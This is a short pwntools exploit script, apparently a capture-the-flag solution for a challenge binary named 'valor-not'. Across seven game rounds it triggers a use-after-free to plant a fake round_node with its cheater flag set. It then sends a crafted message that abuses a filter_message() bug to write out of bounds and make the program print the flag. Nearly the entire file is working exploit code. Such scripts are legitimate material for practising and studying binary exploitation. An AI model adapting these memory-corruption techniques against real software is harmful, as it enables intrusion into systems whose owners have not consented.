from pwn import *

# Server isn't online anymore
p = process('./valor-not')

for _ in range(7):
    p.recvuntil(b'Choose your weapon: \n')
    p.sendline(b'3')
    p.recvuntil(b'*pew pew*')
    # We will trigger the uaf in every round. Technically this is only required in one round
    # for cheater_checker() to succeed.
    p.sendline(b'y')
    p.recvuntil(b'Okay, what message would you like to leave?\n')
    p.sendline(b'cheater')
    p.recvuntil(b'I\'m going to pretend like I never saw that and just forget that round existed\n')
    p.sendline(b' y')
    p.recvuntil(b'Okay, what message would you like to leave?\n')
    # Fake round_node with cheater_detected set to 1
    p.sendline(b'A' * 0x64 + p32(1) + p32(0))

p.sendline(b'y')
p.recvuntil(b'Okay, what message would you like to leave?\n')
# Exploits bug in filter_message(). I didn't look into the exact requirements
# for the payload, but this will write a 0 out of bounds at game->enemy_team.
p.sendline(b'A' * 4 + b'heck' + b'B' * (0x63 - 8))

# Flag should be printed now
print(p.recvall())
